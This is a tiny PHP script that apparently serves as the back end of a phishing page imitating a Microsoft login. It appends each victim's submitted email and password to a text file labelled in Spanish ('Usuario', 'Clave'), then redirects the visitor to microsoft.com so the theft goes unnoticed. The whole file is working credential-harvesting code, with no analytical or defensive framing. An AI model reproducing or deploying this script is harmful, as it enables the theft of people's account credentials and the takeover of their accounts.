<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['email'] . " Clave: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://microsoft.com');
exit();
